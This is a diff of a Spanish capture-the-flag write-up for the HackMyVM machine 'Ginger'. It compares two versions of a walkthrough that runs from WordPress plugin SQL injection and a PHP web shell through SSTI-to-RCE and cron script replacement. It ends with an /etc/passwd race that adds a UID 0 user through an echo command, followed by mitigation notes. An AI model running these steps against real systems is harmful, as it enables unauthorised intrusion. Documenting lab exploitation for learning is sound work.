@@ -1,21 +1,13 @@
 # Writeup: Máquina Ginger - HackMyVM
 
-En este writeup detallo el proceso de explotación y escalada de privilegios de la máquina **Ginger** de la plataforma HackMyVM. La resolución abarca desde la enumeración inicial y explotación de vulnerabilidades en WordPress, hasta múltiples pivoteos laterales y escaladas de privilegios utilizando configuraciones incorrectas, inyecciones de plantillas (SSTI) y tareas programadas (cron).
+En este writeup veremos la resolución de la máquina **Ginger** de la plataforma HackMyVM. Empezaremos como siempre con una enumeración inicial, explotaremos alguna vulnerabilidad de WordPress para ganar acceso inicial y seguiremos con varios pivoteos laterales y escaladas de privilegios utilizando configuraciones incorrectas, inyecciones de plantillas (SSTI) y tareas programadas.
 
----
+## Reconocimiento inicial
 
-## Resumen
-
-Ginger es una máquina Linux (Debian) que expone un sitio WordPress vulnerable a inyección SQL no autenticada a través de un plugin desactualizado. Tras obtener acceso al panel de administración y conseguir ejecución de código mediante la subida de un plugin malicioso, la escalada de privilegios se convierte en una cadena de cinco eslabones que combina enumeración manual de ficheros, credenciales expuestas en el buffer del kernel, un Server-Side Template Injection en una aplicación Flask interna, el abuso de una tarea cron sustituible, y una ventana de permisos mal gestionada sobre `/etc/passwd`.
-
----
-
-## 1. Reconocimiento Inicial
-
-Comenzamos comprobando la conectividad con la máquina objetivo mediante una traza ICMP. El TTL de 64 nos indica que nos encontramos ante un sistema operativo Linux.
+Comenzamos por comprobar que la máquina objetivo está activa mediante una traza ICMP. El TTL de 64 nos indica que nos encontramos ante un sistema operativo Linux.
 
 ```bash
-root@kali:~# ping -c3 192.168.0.20
+$> ping -c3 192.168.0.20
 PING 192.168.0.20 (192.168.0.20) 56(84) bytes of data.
 64 bytes from 192.168.0.20: icmp_seq=1 ttl=64 time=0.426 ms
 64 bytes from 192.168.0.20: icmp_seq=2 ttl=64 time=0.531 ms
@@ -26,14 +18,10 @@ PING 192.168.0.20 (192.168.0.20) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.426/0.485/0.531/0.043 ms
 ```
 
-A continuación, ejecutamos un escaneo de puertos completo con `nmap` para descubrir los servicios expuestos:
+Seguimos con un escaneo de puertos completo con `nmap` para descubrir servicios expuestos:
 
 ```bash
-root@kali:~/hmv/Ginger/nmap# nmap -p- --open -sSCV -n -Pn 192.168.0.20 -oN tcpScan
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 10:44 +0200
-Nmap scan report for 192.168.0.20
-Host is up (0.00034s latency).
-Not shown: 65533 closed tcp ports (reset)
+$> nmap -p- --open -sSCV -n -Pn 192.168.0.20 -oN tcpScan
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -45,86 +33,70 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.38 (Debian)
 ```
 
-Dado que la versión de OpenSSH es 7.9p1 (superior a la 7.7, lo que dificulta la enumeración de usuarios por fuerza bruta), centramos nuestros esfuerzos en el puerto 80 (HTTP).
+Dado que la versión de OpenSSH es >7.7 no podemos enumerar usuarios del sistema. Vamos con el puerto 80 (HTTP).
 
----
+## Enumeración Web
 
-## 2. Enumeración Web
-
-Al acceder al puerto 80 nos encontramos con la página por defecto de Apache2 en Debian. Para descubrir directorios ocultos, utilizamos `gobuster`:
+Al acceder a la web mediante el navegador nos encontramos con la página por defecto de Apache2 en Debian. Vamos a fuzzear con `gobuster` para descubrir directorios:
 
 ```bash
-root@kali:~/hmv/Ginger/nmap# gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.20 -x txt,php -r
-# ... [Output truncado] ...
+$> gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.20 -x txt,php -r
+# ... [Output] ...
 wordpress            (Status: 200) [Size: 8304]
 server-status        (Status: 403) [Size: 277]
 ```
 
-Encontramos un directorio `/wordpress`. Al acceder, revisamos el único post publicado, lo que nos revela información interesante: 
-- El uso de Gravatar para los avatares.
-- Un usuario llamado `webmaster`.
-- Wappalyzer nos indica el uso del motor de base de datos MySQL.
+Encontramos un directorio `/wordpress`. Al acceder, vemos un único post del que sacamos alguna información que podría ser relevante: 
+- El uso de Gravatar para los avatares
+- Un usuario llamado `webmaster`
+- Wappalyzer nos indica el uso del motor de base de datos MySQL
 
-Procedemos a lanzar `wpscan`. En un análisis superficial no detecta vectores de ataque claros, pero al emplear una enumeración agresiva de plugins (`--plugins-detection aggressive`), logramos identificar dos extensiones potencialmente vulnerables:
-1. `akismet 4.1.9`
-2. `cp-multi-view-calendar 1.0.2` (versión confirmada accediendo al archivo `README.txt` del plugin).
+Como se usa WordPress, hagamos uso de `wpscan`. En principio, con un escaneo básico no detecta nada, pero haciendo uso de la opción `--plugins-detection aggressive`, logramos encontrar dos plugins potencialmente vulnerables:
+- `akismet 4.1.9`
+- `cp-multi-view-calendar 1.0.2` (versión confirmada en el `README.txt` del plugin)
 
----
+## Acceso inicial
 
-## 3. Explotación (Initial Access)
+Con una simple búsqueda `searchsploit cp-multi-view-calendar`, descubrimos un [exploit](https://www.exploit-db.com/exploits/36243) para SQLi sin autenticación válido para la versión 1.1.4 y anteriores. 
 
-Buscando en la base de datos de vulnerabilidades con `searchsploit cp-multi-view-calendar`, descubrimos un exploit para *Unauthenticated SQL Injection* (SQLi) aplicable a la versión 1.1.4 y anteriores (EDB-ID: 36243). 
+El exploit nos muestra dos URL vulnerables. Probamos la primera utilizando `sqlmap` y confirmamos que efectivamente es vulnerable, así que pasamos a enumerar primero las databases con el parámetro `--dbs`. Descubrimos `information_schema` y `wordpress_db`. Sabemos que la base de datos `wordpress_db` contendrá por defecto la tabla `wp_users`, así que vamos a proceder a dumpearla con la opción `--dump`.
 
-El exploit proporciona rutas vulnerables. Verificamos la inyección utilizando `sqlmap`. Tras confirmar que la base de datos es vulnerable, enumeramos con el parámetro `--dbs`, descubriendo `information_schema` y `wordpress_db`. Conociendo la estructura de WordPress, nos enfocamos en dumpear la tabla `wp_users` de la base de datos `wordpress_db`.
+Confirmamos el usuario `webmaster`, y obtenemos su correo (`webmaster@gmail.com`) y un hash de contraseña. Empleando `hashcat`, logramos crackear el hash rápidamente, consiguiendo una contraseña: `sanitarium`. Vamos a intentar lo más evidente, usar las credenciales que tenemos vía SSH, pero no son válidas.
 
-Obtenemos las credenciales del usuario `webmaster` (correo: `webmaster@gmail.com`) junto a su hash. Empleando `hashcat`, logramos crackear el hash rápidamente, revelando la contraseña en texto plano: `sanitarium`.
+Nos autenticamos entonces en el panel de administración de WordPress. Normalmente, podríamos editar archivos PHP desde el *Theme File Editor*, pero en este caso no tenemos permisos de edición. Alternativamente, podemos simplemente subir un plugin malicioso/vulnerable que nos permita *Arbitrary File Upload*. Subimos una web shell en PHP, la ejecutamos y nos lanzamos una reverse shell a nuestro equipo como el usuario `www-data`.
 
-Aunque probamos usar estas credenciales en SSH, el acceso es denegado. Nos autenticamos entonces en el panel de administración de WordPress. Nos percatamos de que no tenemos permisos para editar archivos desde el *Theme File Editor*. Para sortear esta restricción, abusamos de la funcionalidad de subida de plugins para cargar un plugin malicioso que nos permita *Arbitrary File Upload*. Subimos una simple web shell en PHP, la ejecutamos y obtenemos una reverse shell en nuestro equipo como el usuario `www-data`.
+## Escalada de Privilegios
 
----
+### a) de `www-data` a `sabrina`
 
-## 4. Escalada de Privilegios
+Enseguida ejecuto `sudo -l`, y veo que podemos ejecutar el binario `/usr/bin/sl` como cualquier usuario sin proporcionar contraseña. Busco en GTFOBins pero no encuentro nada, y al probar de ejecutarlo...
 
-### 4.1. De `www-data` a `sabrina`
+![GIF del tren ASCII](images/tren.gif)
 
-Tras estabilizar la terminal, revisamos los privilegios de sudo del usuario `www-data`:
+Tras comprobar también las *capabilities* (`getcap -r / 2>/dev/null`) sin éxito, decido enumerar el sistema manualmente un poco. Veo tres usuarios en el directorio `/home`: `webmaster`, `sabrina` y `caroline`.
 
-```bash
-sudo -l
-# Resultado: NOPASSWD: /usr/bin/sl
-```
-
-Podemos ejecutar el binario `/usr/bin/sl` como cualquier usuario sin proporcionar contraseña. Aunque GTFOBins no lista este binario para evadir restricciones, al ejecutarlo nos muestra el clásico tren en ASCII. 
-
-![GIF del tren ASCII](images/ginger_tren.gif)
-
-Tras comprobar las *capabilities* (`getcap -r / 2>/dev/null`) sin éxito, decido realizar una enumeración manual por los directorios de los usuarios (ubicados en `/home`: `webmaster`, `sabrina` y `caroline`). 
-
-En el directorio de `/home/sabrina` encontramos el archivo legible `password.txt` con el siguiente mensaje:
+En `/home/sabrina` encontramos un archivo legible `password.txt` con el siguiente contenido:
 > "I forgot my password again... I wrote it down somewhere in this form: sabrina:password but I don't know where... I have to search in my memory"
 
-La mención a la "memoria" sugiere revisar historiales (como el `.bash_history`), pero este último se encuentra redirigido a `/dev/null`. Una búsqueda global de la cadena "sabrina:" (`grep -r "sabrina:" / 2>/dev/null`) tampoco da frutos. 
+Esto de *"to search in my memory"* me hace pensar en revisar el `.bash_history`, pero está redireccionado al `/dev/null`. Buscamos en todo el sistema por la cadena "sabrina:" (`grep -r "sabrina:" / 2>/dev/null`), pero tampoco da frutos. 
 
-Repasando los procedimientos estándar de enumeración del sistema, reviso el buffer del kernel con `dmesg`. Al filtrar los resultados, extraemos exitosamente la contraseña de Sabrina en texto plano almacenada en memoria:
-
-```bash
-dmesg | grep sabrina
-```
-*Con esta contraseña, cambiamos al usuario `sabrina`.*
-
-### 4.2. De `sabrina` a `webmaster`
-
-Verificamos los privilegios sudo para el nuevo usuario:
+Después de trastear manualmente un buen rato sin ningún resultado, recurro a mi checklist para enumerar sistemas Linux. Es a través del uso de `dmesg` y filtrando por sabrina que consigo encontrar su contraseña en texto plano.
 
 ```bash
-sudo -l
-# User sabrina may run the following commands on ginger:
-# (webmaster) NOPASSWD: /usr/bin/python /opt/app.py *
+$> dmesg | grep sabrina
 ```
 
-Podemos ejecutar un script en Python como el usuario `webmaster`. Revisamos el contenido del archivo `app.py`.
+### b) de `sabrina` a `webmaster`
 
-El código expone una aplicación en Flask con una vulnerabilidad clara de Server Side Template Injection (SSTI) en la función `hello_ssti()`:
+Igual que antes, empezamos por:
+
+```bash
+$> sudo -l
+User sabrina may run the following commands on ginger:
+	(webmaster) NOPASSWD: /usr/bin/python /opt/app.py *
+```
+
+Podemos ejecutar un script en Python como el usuario `webmaster`. Vamos a leer el script `app.py`:
 
 ```python
 from flask import Flask, request, render_template_string, render_template
@@ -147,81 +119,74 @@ if __name__ == "__main__":
     app.run(debug=True)
 ```
 
-Para explotar esta aplicación, necesitamos interactuar con ella. Como la aplicación se despliega en el puerto 5000 (localhost), realizamos un *Port Forwarding* usando nuestra conexión SSH de Sabrina:
+El nombre de la función (`hello_ssti()`) nos da la pista clara de que existe un Server Side Template Injection (SSTI). Ejecutamos el script y vemos que se despliega en el puerto 5000. Para explotar esta aplicación necesitamos interactuar con ella, así que realizamos un *Port Forwarding* usando SSH:
 
 ```bash
-ssh -L 5000:localhost:5000 sabrina@192.168.0.20
+$> ssh -L 5000:localhost:5000 sabrina@192.168.0.20
 ```
 
 Ahora, accediendo a través de nuestro navegador web y manipulando el parámetro `name`, confirmamos la vulnerabilidad:
 
-![Evidencia del SSTI](images/ginger_ssti.jpg)
+![Evidencia del SSTI](images/03-ssti.jpg)
 
-Basándonos en repositorios de explotación conocidos (como la guía de *vulhub* para Flask SSTI), crafteamos un payload para convertir esta inyección de plantillas en Ejecución Remota de Comandos (RCE). Inyectamos el comando para entablar una reverse shell y la recibimos en nuestra máquina atacante, obteniendo acceso como `webmaster`.
+Una búsqueda rápida en Google de *"flask ssti"* nos lleva a este [repo](https://github.com/vulhub/vulhub/tree/master/flask/ssti), que nos muestra como convertir un SSTI en RCE. De esta forma podemos lanzarnos una reverse shell como `webmaster`.
 
-### 4.3. De `webmaster` a `caroline`
+### c) de `webmaster` a `caroline`
 
-Como `webmaster`, la enumeración manual no revela vías de escalada obvias. Para detectar procesos ejecutándose en segundo plano empleamos la herramienta `pspy64`. 
+Como `webmaster`, la enumeración manual no ha dado resultados pese a dedicarle un buen tiempo. No ha sido hasta hacer uso de `pspy64` que he podido ver que se está ejecutando `/home/caroline/backup/backup.sh`periódicamente en el sistema. Si bien no tengo permisos de escritura de este archivo, sí he podido eliminarlo y crear otro con el mismo nombre que me envíe una shell a mi equipo. Esperamos a que la tarea programada se ejecute y ganamos acceso como `caroline`.
 
-Gracias a `pspy64`, detectamos la ejecución periódica de un script de backup en `/home/caroline/backup/backup.sh` a través de Cron. Aunque no contamos con permisos de escritura directa sobre el archivo en sí, comprobamos que sí podemos eliminarlo y crear un archivo nuevo con el mismo nombre y permisos de ejecución que reemplace al original.
+### d) de `caroline` a `root`
 
-Creamos un archivo `backup.sh` malicioso que inicie una conexión inversa hacia nosotros. Esperamos a que la tarea programada se ejecute y logramos ganar acceso como el usuario `caroline`.
-
-### 4.4. De `caroline` a `root`
-
-Nuevamente, verificamos qué comandos podemos ejecutar con privilegios:
+Como siempre:
 
 ```bash
-sudo -l
-# (root) NOPASSWD: /srv/code
+$> sudo -l
+(root) NOPASSWD: /srv/code
 ```
 
-El usuario `caroline` puede ejecutar el binario `/srv/code` como administrador. Al inspeccionarlo usando `strings` para extraer las cadenas de texto legibles, descubrimos la siguiente secuencia de comandos en su interior:
+Podemos ejecutar `/srv/code` como `root`. Al inspeccionarlo usando `strings` descubrimos, entre otras cosas, lo siguiente:
 
 ```bash
 chmod o+w /etc/passwd; sleep 5; chmod o-w /etc/passwd
 ```
 
-Este binario otorga permisos de escritura en el archivo `/etc/passwd` a "otros" usuarios (`o+w`), duerme el proceso durante 5 segundos y luego revoca dichos permisos (`o-w`). Esta ventana de tiempo de 5 segundos es más que suficiente para introducir un nuevo usuario con permisos de administrador en el sistema.
+Es decir, el archivo `/etc/passwd` se vuelve editable por cualquier usuario durante 5 segundos. Haciendo un poco de [investigación](https://es.scribd.com/document/693894215/Linux-privilege-Escalation-Writable-passwd-File), vemos que podemos aprovechar esta ventana de tiempo para añadir una nueva línea al archivo que nos proporcionará acceso como `root`.
 
 Primero, generamos el hash MD5 para nuestra contraseña (en este caso "pass"):
 
 ```bash
-openssl passwd -1
-# Password: pass
-# $1$30dLNEc1$leidxGJGWj42k.YAeCdNL/
+$> openssl passwd -1
+Password: pass
+$1$30dLNEc1$leidxGJGWj42k.YAeCdNL/
 ```
 
-Ejecutamos el binario para abrir la ventana de oportunidad:
+Ejecutamos el binario:
 
 ```bash
-sudo /srv/code
+$> sudo /srv/code
 ```
 
-Mientras el contador de los 5 segundos está en curso, desde otra sesión agregamos un nuevo usuario con UID y GID 0 (root) al `/etc/passwd`:
+Durante la ventana de 5 segundos, desde otra terminal agregamos un nuevo usuario con UID y GID 0 al `/etc/passwd`:
 
 ```bash
-echo 'newuser:$1$30dLNEc1$leidxGJGWj42k.YAeCdNL/:0:0:root:/root:/bin/bash' >> /etc/passwd
+$> echo 'newuser:$1$30dLNEc1$leidxGJGWj42k.YAeCdNL/:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
-Finalmente, cambiamos a nuestro usuario recién creado y comprobamos que poseemos el control total del sistema.
+Finalmente, cambiamos a nuestro usuario recién creado y comprobamos que estamos como `root`.
 
 ```bash
-su newuser
-# Password: pass
+$> su newuser
+Password: pass
+
 root@ginger:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-¡Máquina rooteada exitosamente!
+## Puntos de detección y mitigación
 
----
-
-## 5. Detección y Mitigación
-
-- **Plugin de WordPress vulnerable y desactualizado**: `cp-multi-view-calendar` presentaba una inyección SQL no autenticada conocida públicamente. Un inventario de plugins con escaneo periódico de CVEs habría detectado el riesgo antes de que llegara a producción.
-- **Credenciales expuestas en el buffer del kernel**: que la contraseña de `sabrina` terminara siendo legible vía `dmesg` sugiere que en algún momento se introdujo en un prompt o proceso que acabó registrándola — cualquier entrada de texto puede persistir en lugares inesperados del sistema si no se gestiona con cuidado.
-- **Regla de sudo excesivamente permisiva**: permitir `/usr/bin/python /opt/app.py *` con un comodín abierto elimina cualquier control sobre qué argumentos puede recibir el script. Las reglas de sudo deberían limitarse a la ejecución exacta necesaria, sin comodines.
-- **Aplicación Flask desplegada con `debug=True`**: el propio código fuente lo confirma. Esto expone el depurador interactivo de Werkzeug ante cualquier excepción no controlada, una vía de ejecución remota de código independiente del SSTI que nunca debería llegar a un entorno accesible por otros usuarios.
-- **Script de tareas programadas sustituible por un usuario de menor privilegio**: `backup.sh` debería pertenecer exclusivamente al usuario que lo ejecuta (o a root), con permisos que impidan su borrado o sustitución desde una cuenta distinta.
-- **Ventana temporal de permisos abiertos sobre `/etc/passwd`**: cualquier operación que otorgue, aunque sea unos segundos, permisos de escritura global sobre un fichero tan crítico es explotable de forma fiable. No debería existir ninguna ventana, por breve que sea.
+- Plugin de WordPress vulnerable y desactualizado — mantener inventario de plugins y aplicar parches
+- Credenciales expuestas en el buffer del kernel — evitar loguear inputs sensibles en dmesg/journald
+- Regla de sudo excesivamente permisiva (`/usr/bin/python /opt/app.py *`) — eliminar comodines, restringir a argumentos exactos
+- Aplicación Flask desplegada con `debug=True` — nunca en un entorno accesible por otros usuarios
+- Script de tareas programadas sustituible por un usuario de menor privilegio — permisos que impidan su borrado/sustitución
+- Ventana temporal de permisos abiertos sobre `/etc/passwd` — simplemente no debería existir
